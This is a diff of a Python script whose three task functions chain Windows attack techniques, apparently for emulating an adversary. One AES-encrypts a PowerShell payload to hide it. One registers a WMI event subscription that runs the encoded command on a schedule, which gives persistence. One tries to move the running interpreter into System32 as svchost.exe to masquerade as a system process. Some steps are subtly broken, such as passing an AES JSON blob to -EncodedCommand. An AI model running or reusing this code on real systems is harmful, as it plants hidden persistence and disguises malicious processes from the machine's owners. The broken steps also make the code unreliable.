@@ -1,56 +1,78 @@
 #!/usr/bin/env python3
-import sys, json, time
-from typing import Dict, Any
-import base64
+import sys
+import json
+import time
+import os
 import subprocess
+import ctypes
+from typing import Dict, Any
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+import winreg
 
 def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        # Sample PowerShell script to be obfuscated
-        powershell_script = "Write-Host 'Hello, World!'"
-
-        # Obfuscate the PowerShell script by encoding it in base64
-        script_bytes = powershell_script.encode('utf-16le')
-        obfuscated_script = base64.b64encode(script_bytes).decode()
-
-        # Prepare the result
-        result = {
-            "script": obfuscated_script
+        # Generate a random 16-byte key and IV
+        key = os.urandom(16)
+        iv = os.urandom(16)
+        
+        # Example PowerShell payload to be obfuscated
+        payload = "Write-Host 'Hello, World!'"
+        
+        # Pad the payload to a 16-byte boundary
+        padded_payload = pad(payload.encode(), AES.block_size)
+        
+        # Encrypt the padded payload using AES CBC mode
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        ciphertext = cipher.encrypt(padded_payload)
+        
+        # Create the obfuscated script with key and iv as hex strings
+        obfuscated_script = {
+            'ciphertext': ciphertext.hex(),
+            'key': key.hex(),
+            'iv': iv.hex()
         }
-
+        
+        # Convert the obfuscated script to a JSON string
+        script = json.dumps(obfuscated_script)
+        
+        result = {'script': script}
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
     except Exception as e:
-        # Return partial result with fallback value for 'script'
-        return {'success': False, 'data': {'script': None}, 'error': f'{type(e).__name__}: {e}',
+        return {'success': False, 'data': {'script': None},
+                'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
 
 def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        # Extract the obfuscated PowerShell script from input data
+        # Extract the obfuscated PowerShell script from input_data
         script = input_data.get('script', '')
 
-        # Define the WMI event subscription command
-        command = [
-            'powershell', '-Command',
-            f"Register-WmiEvent -Query \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 0 AND TargetInstance.Minute = 0\" "
-            f"-Action {{ {script} }} -Name 'StartupScriptEvent' -Namespace 'root\\subscription'"
-        ]
+        # Define the WMI Event Subscription command
+        subscription_name = "StartupScript"
+        command = f"powershell.exe -EncodedCommand {script}"
 
-        # Execute the command to create the WMI event subscription
-        subprocess.run(command, check=True, timeout=30)
+        # Create the WMI Event Subscription using PowerShell
+        wmi_command = (
+            f"Register-WmiEvent -Query \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE "
+            f"TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 8 AND TargetInstance.Minute = 0\" "
+            f"-Action {{ {command} }} -Name {subscription_name}"
+        )
 
-        # Return the subscription ID (using the name of the event as a placeholder)
-        result = {'subscription_id': 'StartupScriptEvent'}
+        # Execute the PowerShell command
+        subprocess.run(["powershell.exe", "-Command", wmi_command], capture_output=True, timeout=30)
+
+        # Return the subscription ID (name used for the subscription)
+        result = {'subscription_id': subscription_name}
 
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
     except Exception as e:
-        # Return partial result with fallback value for subscription_id
         return {'success': False, 'data': {'subscription_id': None},
                 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
@@ -59,22 +81,33 @@ def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        # Extract the subscription_id from input_data
-        subscription_id = input_data.get('subscription_id', '')
-
-        # Define a legitimate Windows service name to masquerade as
+        # Define the target service name to masquerade as
         legitimate_service_name = "svchost.exe"
-
-        # Prepare the result with the masqueraded process name
+        
+        # Get the current executable path
+        current_exe = sys.executable
+        
+        # Determine the target path in system32 directory
+        system32_path = os.path.join(os.environ.get('WINDIR', 'C:\\Windows'), 'System32', legitimate_service_name)
+        
+        # Attempt to copy the current executable to the system32 directory with the legitimate service name
+        try:
+            # Use ctypes to set the process name if needed
+            ctypes.windll.kernel32.SetConsoleTitleW(legitimate_service_name)
+            os.rename(current_exe, system32_path)
+            renamed = True
+        except Exception:
+            renamed = False
+        
+        # Prepare the result
         result = {
-            "process_name": legitimate_service_name
+            "service_name": legitimate_service_name if renamed else None
         }
-
+        
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
     except Exception as e:
-        # Return partial result with fallback value on failure
-        return {'success': False, 'data': {'process_name': None},
+        return {'success': False, 'data': {'service_name': None},
                 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
 
